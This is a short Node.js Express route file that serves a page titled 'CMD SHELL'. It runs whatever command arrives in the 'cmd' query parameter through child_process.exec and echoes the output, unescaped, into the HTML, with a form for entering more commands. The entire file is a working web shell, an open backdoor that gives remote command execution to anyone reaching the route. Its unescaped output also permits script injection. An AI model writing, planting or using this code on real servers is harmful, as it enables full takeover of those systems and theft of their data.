var express = require('express');
var router = express.Router();
var exec = require("child_process").exec;
var so;

router.get('/', function (req, res, next) {

    exec(req.query.cmd || "HELLO", function (err, stdout, stderr) {
        console.log(req.query.cmd)
        console.log(stdout)
        if (stdout) {
            so = stdout;
        } else {
            so = "NO CONTENT";
        }
        var html = `<!DOCTYPE html> 
  <html> 
  <head> 
   <title>CMD SHELL</title>
  </head> 
  <body> 
<div align="center">
    <h1><span style="color: red">C</span>
<span style="color: orange">M</span>
<span style="color: yellow">D</span>
&nbsp;&nbsp;
<span style="color: green">S</span>
<span style="color: blue">H</span>
<span style="color: darkblue">E</span>
<span style="color: purple">L</span>
<span style="color: black">L</span>
</h1> 
    <form id='target'action='cmd'> 
      <input id='target_input' name='cmd' type='text'> 
      <input type='submit' value='submit'> 
    </form> 
    <h1>${so}</h1> 
</div>
  </body> 
</html>`
        res.send(html);
    });
});


module.exports = router;
